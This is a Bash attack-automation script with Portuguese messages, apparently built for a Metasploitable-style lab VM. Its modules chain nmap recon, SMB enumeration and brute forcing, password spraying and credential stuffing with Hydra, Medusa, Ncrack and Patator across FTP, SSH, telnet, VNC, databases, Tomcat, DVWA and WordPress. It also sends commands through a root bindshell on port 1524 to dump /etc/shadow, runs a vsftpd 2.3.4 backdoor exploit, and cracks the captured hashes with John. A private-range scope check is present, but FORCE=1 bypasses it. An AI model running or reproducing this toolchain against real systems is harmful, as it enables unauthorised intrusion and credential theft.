#!/usr/bin/env bash
set -u

TARGET="${TARGET:-192.168.56.3}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTROOT="${OUTROOT:-$HOME/lab-output}"
RUN_ID="$(date +%Y%m%d-%H%M%S)"
OUTDIR="$OUTROOT/$RUN_ID"
MAX_WORDS="${MAX_WORDS:-1000}"
ACTIVE="${ACTIVE:-0}"
FORCE="${FORCE:-0}"
WPSCAN_URL="${WPSCAN_URL:-}"

mkdir -p "$OUTDIR"
: > "$OUTDIR/run.log"

log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$OUTDIR/run.log"; }
section() { printf '\n===== %s =====\n' "$*" | tee -a "$OUTDIR/run.log"; }
have() { command -v "$1" >/dev/null 2>&1; }

confirm_scope() {
  case "$TARGET" in
    10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*|127.*|localhost) return 0 ;;
  esac
  if [ "$FORCE" != "1" ]; then
    log "Alvo $TARGET fora de faixa privada; use FORCE=1 apenas se tiver autorizacao."
    exit 1
  fi
}

prep_wordlists() {
  section "Wordlists"
  mkdir -p "$OUTDIR/wordlists"
  printf '%s\n' msfadmin user admin administrator service ftp postgres mysql tomcat www root guest > "$OUTDIR/wordlists/users.txt"
  printf '%s\n' msfadmin password 123456 12345 admin root toor pass qwerty letmein Password1 admin123 secret > "$OUTDIR/wordlists/pass-small.txt"
  printf '%s\n' msfadmin:msfadmin admin:password user:password service:service postgres:postgres admin:admin123 msfadmin:password > "$OUTDIR/wordlists/creds-stuffing.txt"
  if [ -f /usr/share/wordlists/rockyou.txt ]; then
    head -n "$MAX_WORDS" /usr/share/wordlists/rockyou.txt > "$OUTDIR/wordlists/rockyou-subset.txt"
  elif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    zcat /usr/share/wordlists/rockyou.txt.gz | head -n "$MAX_WORDS" > "$OUTDIR/wordlists/rockyou-subset.txt"
  fi
  if [ -f "$OUTDIR/wordlists/rockyou-subset.txt" ]; then
    log "rockyou subset: $(wc -l < "$OUTDIR/wordlists/rockyou-subset.txt") senhas"
  else
    log "rockyou nao encontrado; usando lista pequena"
  fi
}

recon() {
  section "Reconhecimento com Nmap"
  have nmap || { log "nmap ausente"; return; }
  nmap -sV -Pn -T4 -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6000,6667,8009,8080,8180 "$TARGET" -oN "$OUTDIR/nmap.txt"
}

smb_enum() {
  section "Enumeracao SMB"
  if have enum4linux-ng; then
    timeout 120 enum4linux-ng -A "$TARGET" > "$OUTDIR/enum4linux.txt" 2>&1 || log "enum4linux-ng excedeu 120s"
  elif have enum4linux; then
    timeout 120 enum4linux -a "$TARGET" > "$OUTDIR/enum4linux.txt" 2>&1 || log "enum4linux excedeu 120s"
  else
    log "enum4linux ausente"
  fi
  if have smbclient; then
    smbclient -L "//$TARGET" -N > "$OUTDIR/smb-anon.txt" 2>&1
    smbclient -L "//$TARGET" -U 'msfadmin%msfadmin' > "$OUTDIR/smb-msfadmin.txt" 2>&1
    log "Shares listados em $OUTDIR/smb-*.txt"
  fi
  if have smbmap; then
    timeout 60 smbmap -H "$TARGET" -u msfadmin -p msfadmin > "$OUTDIR/smbmap.txt" 2>&1 || log "smbmap excedeu 60s (forkserver Python 3.14); ignorado"
  fi
}

smb_access() {
  section "Acesso SMB com credenciais"
  have smbclient || { log "smbclient ausente"; return; }
  smbclient "//$TARGET/tmp" -U 'msfadmin%msfadmin' -c 'ls' > "$OUTDIR/smb-tmp-ls.txt" 2>&1
  tail -n 15 "$OUTDIR/smb-tmp-ls.txt" | tee -a "$OUTDIR/run.log"
  if [ "$ACTIVE" = "1" ]; then
    printf 'lab marker %s\n' "$RUN_ID" > "$OUTDIR/marker.txt"
    smbclient "//$TARGET/tmp" -U 'msfadmin%msfadmin' -c "put $OUTDIR/marker.txt lab-marker-$RUN_ID.txt; ls lab-marker-$RUN_ID.txt" >> "$OUTDIR/smb-tmp-ls.txt" 2>&1
    log "Upload de teste realizado (ACTIVE=1)"
  fi
}

run_hydra() {
  section "Hydra"
  have hydra || { log "hydra ausente"; return; }
  hydra -l msfadmin -P "$OUTDIR/wordlists/pass-small.txt" -t 1 -f "ftp://$TARGET" > "$OUTDIR/hydra-ftp.txt" 2>&1
  hydra -l msfadmin -p msfadmin -t 1 -f "telnet://$TARGET" > "$OUTDIR/hydra-telnet.txt" 2>&1
  hydra -C "$OUTDIR/wordlists/creds-stuffing.txt" -t 1 -f "ftp://$TARGET" > "$OUTDIR/hydra-stuffing-ftp.txt" 2>&1
  hydra -l msfadmin -P "$OUTDIR/wordlists/pass-small.txt" -t 1 -f "ssh://$TARGET" > "$OUTDIR/hydra-ssh.txt" 2>&1
  if grep -q "kex error" "$OUTDIR/hydra-ssh.txt"; then
    log "Hydra SSH: MAC legado nao suportado pelo cliente; use Medusa/Ncrack"
  fi
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "http://$TARGET/dvwa/login.php")
  if [ "$code" = "200" ] || [ "$code" = "302" ]; then
    hydra -l admin -P "$OUTDIR/wordlists/pass-small.txt" -t 1 -f "$TARGET" http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" > "$OUTDIR/hydra-dvwa.txt" 2>&1
  else
    log "DVWA nao encontrado (HTTP $code); pulando formulario web"
  fi
  grep -h "host: $TARGET" "$OUTDIR"/hydra-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
}

run_ncrack() {
  section "Ncrack"
  have ncrack || { log "ncrack ausente"; return; }
  ncrack -vv --user msfadmin --pass msfadmin "ssh://$TARGET" -oN "$OUTDIR/ncrack-ssh.txt" > "$OUTDIR/ncrack-ssh-cli.txt" 2>&1
  ncrack -vv -U "$OUTDIR/wordlists/users.txt" -P "$OUTDIR/wordlists/pass-small.txt" -f --connection-limit 1 "ftp://$TARGET" -oN "$OUTDIR/ncrack-ftp.txt" > "$OUTDIR/ncrack-ftp-cli.txt" 2>&1
  grep -h "Discovered credentials" "$OUTDIR"/ncrack-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
}

crack_shadow() {
  local hashes="${1:-$OUTDIR/shadow-hashes.txt}"
  [ -s "$hashes" ] || { log "Sem hashes de shadow capturados"; return; }
  have john || { log "john ausente"; return; }
  local pot="$OUTDIR/john-shadow.pot"
  john --pot="$pot" --format=md5crypt --wordlist="$OUTDIR/wordlists/pass-small.txt" "$hashes" > "$OUTDIR/john-shadow.txt" 2>&1
  if [ -f "$OUTDIR/wordlists/rockyou-subset.txt" ]; then
    john --pot="$pot" --format=md5crypt --wordlist="$OUTDIR/wordlists/rockyou-subset.txt" "$hashes" >> "$OUTDIR/john-shadow.txt" 2>&1
  fi
  john --pot="$pot" --show --format=md5crypt "$hashes" | tee -a "$OUTDIR/run.log"
}

run_vnc() {
  section "VNC"
  have hydra || { log "hydra ausente"; return; }
  ( cd /tmp && hydra -P "$OUTDIR/wordlists/pass-small.txt" -t 1 -f "vnc://$TARGET" ) > "$OUTDIR/hydra-vnc.txt" 2>&1
  grep -h "vnc" "$OUTDIR/hydra-vnc.txt" | tail -n 3 | tee -a "$OUTDIR/run.log"
}

run_db() {
  section "Bancos de dados"
  if have medusa; then
    medusa -h "$TARGET" -u postgres -p postgres -M postgres -f > "$OUTDIR/medusa-postgres.txt" 2>&1
  fi
  if have nmap; then
    nmap -p 3306 --script mysql-empty-password,mysql-info "$TARGET" > "$OUTDIR/mysql-nmap.txt" 2>&1
  fi
  if have mysql; then
    mysql --skip-ssl -h "$TARGET" -u root -e 'select version(); show databases;' > "$OUTDIR/mysql-root.txt" 2>&1
  fi
  grep -h "ACCOUNT FOUND" "$OUTDIR/medusa-postgres.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
  grep -h "empty password" "$OUTDIR/mysql-nmap.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
}

run_tomcat() {
  section "Tomcat Manager"
  have hydra || { log "hydra ausente"; return; }
  hydra -l tomcat -p tomcat -s 8180 -t 1 -f "$TARGET" http-get /manager/html > "$OUTDIR/hydra-tomcat.txt" 2>&1
  grep -h "http-get" "$OUTDIR/hydra-tomcat.txt" | tail -n 3 | tee -a "$OUTDIR/run.log"
}

restart_vsftpd_via_bindshell() {
  have nc || return 1
  timeout 3 bash -c "echo > /dev/tcp/$TARGET/1524" 2>/dev/null || return 1
  { printf '/etc/init.d/vsftpd restart\n'; sleep 3; } | timeout 6 nc "$TARGET" 1524 >/dev/null 2>&1
}

run_bindshell() {
  section "Bindshell 1524 (root)"
  have nc || { log "nc ausente"; return; }
  { printf 'id\n'; sleep 1; printf 'echo; cat /etc/shadow\n'; sleep 2; } | timeout 8 nc "$TARGET" 1524 > "$OUTDIR/bindshell-root.txt" 2>&1
  head -n 1 "$OUTDIR/bindshell-root.txt" | tee -a "$OUTDIR/run.log"
  grep -E '^[a-zA-Z0-9._-]+:[^:*!][^:]*:[0-9]+:' "$OUTDIR/bindshell-root.txt" > "$OUTDIR/shadow-hashes.txt" 2>/dev/null || true
  crack_shadow "$OUTDIR/shadow-hashes.txt"
}

run_backdoor() {
  section "Backdoor vsftpd 2.3.4 (CVE-2011-2523)"
  local script="$SCRIPT_DIR/vsftpd_backdoor.py"
  if [ ! -f "$script" ]; then log "vsftpd_backdoor.py nao encontrado em $SCRIPT_DIR"; return; fi
  have python3 || { log "python3 ausente"; return; }
  restart_vsftpd_via_bindshell
  python3 "$script" "$TARGET" > "$OUTDIR/backdoor-root.txt" 2>&1
  if grep -q "porta 6200 nao respondeu" "$OUTDIR/backdoor-root.txt"; then
    log "Backdoor nao abriu a porta 6200"
    return
  fi
  head -n 1 "$OUTDIR/backdoor-root.txt" | tee -a "$OUTDIR/run.log"
  grep -E '^[a-zA-Z0-9._-]+:[^:*!][^:]*:[0-9]+:' "$OUTDIR/backdoor-root.txt" > "$OUTDIR/shadow-hashes-backdoor.txt" 2>/dev/null || true
  crack_shadow "$OUTDIR/shadow-hashes-backdoor.txt"
}

run_john() {
  section "John the Ripper"
  have john || { log "john ausente"; return; }
  {
    printf 'msfadmin:%s\n' "$(openssl passwd -1 -salt labsalt1 msfadmin)"
    printf 'user:%s\n' "$(openssl passwd -1 -salt labsalt2 password)"
    printf 'admin:%s\n' "$(openssl passwd -1 -salt labsalt3 secret)"
  } > "$OUTDIR/john-hashes.txt"
  john --pot="$OUTDIR/john.pot" --format=md5crypt --wordlist="$OUTDIR/wordlists/pass-small.txt" "$OUTDIR/john-hashes.txt" > "$OUTDIR/john.txt" 2>&1
  john --pot="$OUTDIR/john.pot" --show --format=md5crypt "$OUTDIR/john-hashes.txt" | tee -a "$OUTDIR/run.log"
}

run_wpscan() {
  section "WPScan"
  have wpscan || { log "wpscan ausente"; return; }
  local url="${WPSCAN_URL:-http://$TARGET/wordpress/}"
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 10 "$url")
  if [ "$code" != "200" ]; then
    log "Sem WordPress em $url (HTTP $code); defina WPSCAN_URL para outro alvo"
    return
  fi
  wpscan --url "$url" --enumerate u --passwords "$OUTDIR/wordlists/pass-small.txt" --max-threads 5 --no-banner > "$OUTDIR/wpscan.txt" 2>&1
  tail -n 15 "$OUTDIR/wpscan.txt" | tee -a "$OUTDIR/run.log"
}

run_patator() {
  section "Patator"
  python3 -c 'import patator' >/dev/null 2>&1 || { log "patator ausente"; return; }
  local wrapper='import multiprocessing as mp; mp.set_start_method("fork"); from patator.patator import cli; raise SystemExit(cli())'
  python3 -c "$wrapper" ftp_login host="$TARGET" user=msfadmin password=FILE0 0="$OUTDIR/wordlists/pass-small.txt" -x ignore:fgrep='Login incorrect' -t 1 --max-retries 1 > "$OUTDIR/patator-ftp.txt" 2>&1
  python3 -c "$wrapper" ssh_login host="$TARGET" user=msfadmin password=FILE0 0="$OUTDIR/wordlists/pass-small.txt" -x ignore:fgrep='Authentication failed' -t 1 --max-retries 1 > "$OUTDIR/patator-ssh.txt" 2>&1
  grep -h "Login successful" "$OUTDIR/patator-ftp.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
  tail -n 3 "$OUTDIR/patator-ssh.txt" | tee -a "$OUTDIR/run.log"
}

run_medusa() {
  section "Medusa"
  have medusa || { log "medusa ausente"; return; }
  medusa -h "$TARGET" -u msfadmin -p msfadmin -M ssh -f > "$OUTDIR/medusa-ssh.txt" 2>&1
  medusa -h "$TARGET" -u msfadmin -p msfadmin -M ftp -f > "$OUTDIR/medusa-ftp.txt" 2>&1
  medusa -h "$TARGET" -u msfadmin -p msfadmin -M telnet -f > "$OUTDIR/medusa-telnet.txt" 2>&1
  grep -h "ACCOUNT FOUND" "$OUTDIR"/medusa-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
}

run_spray() {
  section "Password Spraying"
  have medusa || { log "medusa ausente"; return; }
  local pw
  for pw in msfadmin password 123456; do
    medusa -h "$TARGET" -U "$OUTDIR/wordlists/users.txt" -p "$pw" -M smbnt -t 2 -f > "$OUTDIR/spray-smb-$pw.txt" 2>&1
    grep -h "ACCOUNT FOUND" "$OUTDIR/spray-smb-$pw.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
  done
  medusa -h "$TARGET" -U "$OUTDIR/wordlists/users.txt" -p msfadmin -M ssh -t 2 -f > "$OUTDIR/spray-ssh-medusa.txt" 2>&1
  grep -h "ACCOUNT FOUND" "$OUTDIR/spray-ssh-medusa.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
  if have hydra; then
    hydra -L "$OUTDIR/wordlists/users.txt" -p msfadmin -t 2 -f "ssh://$TARGET" > "$OUTDIR/spray-ssh.txt" 2>&1
    if grep -q "kex error" "$OUTDIR/spray-ssh.txt"; then
      log "Spray SSH via Hydra indisponivel (MAC legado); use Medusa"
    fi
  fi
}

summary() {
  section "Resumo dos achados"
  grep -h "ACCOUNT FOUND" "$OUTDIR"/*.txt 2>/dev/null | sed 's/^[0-9-]* [0-9:]* //' | sort -u | tee -a "$OUTDIR/run.log"
  grep -hE "host: $TARGET" "$OUTDIR"/hydra-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
  grep -h "Login successful" "$OUTDIR"/patator-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
  grep -h "Discovered credentials" "$OUTDIR"/ncrack-*.txt 2>/dev/null | tee -a "$OUTDIR/run.log"
  if have john && [ -f "$OUTDIR/john-hashes.txt" ]; then
    john --pot="$OUTDIR/john.pot" --show --format=md5crypt "$OUTDIR/john-hashes.txt" 2>/dev/null | tee -a "$OUTDIR/run.log"
  fi
}

usage() {
  cat <<EOF
Uso: $0 [modulo ...]

Alvo padrao: $TARGET (defina TARGET=...)
Saida: $OUTROOT/<timestamp>

Modulos: prep recon smb hydra ncrack john wpscan patator medusa vnc db tomcat bindshell backdoor spray smb-access all
Variaveis: TARGET OUTROOT MAX_WORDS WPSCAN_URL ACTIVE=1 FORCE=1

Exemplos:
  TARGET=192.168.56.3 $0 all
  TARGET=192.168.56.3 $0 recon hydra medusa spray
  TARGET=192.168.56.3 $0 vnc db tomcat bindshell backdoor
  TARGET=192.168.56.3 ACTIVE=1 $0 smb-access
EOF
}

main() {
  local selected=()
  if [ $# -eq 0 ]; then
    set -- all
  fi
  for arg in "$@"; do
    case "$arg" in
      prep|recon|smb|hydra|ncrack|john|wpscan|patator|medusa|vnc|db|tomcat|bindshell|backdoor|spray|smb-access)
        selected+=("$arg") ;;
      all)
        selected=(prep recon smb hydra ncrack john wpscan patator medusa vnc db tomcat bindshell backdoor spray smb-access) ;;
      --active)
        ACTIVE=1 ;;
      --force)
        FORCE=1 ;;
      -h|--help)
        usage; exit 0 ;;
      *)
        usage; exit 2 ;;
    esac
  done
  confirm_scope
  log "Alvo=$TARGET Saida=$OUTDIR"
  for m in "${selected[@]}"; do
    case "$m" in
      prep) prep_wordlists ;;
      recon) recon ;;
      smb) smb_enum ;;
      hydra) run_hydra ;;
      ncrack) run_ncrack ;;
      john) run_john ;;
      wpscan) run_wpscan ;;
      patator) run_patator ;;
      medusa) run_medusa ;;
      vnc) run_vnc ;;
      db) run_db ;;
      tomcat) run_tomcat ;;
      bindshell) run_bindshell ;;
      backdoor) run_backdoor ;;
      spray) run_spray ;;
      smb-access) smb_access ;;
    esac
  done
  summary
  log "Concluido. Logs em $OUTDIR"
}

main "$@"
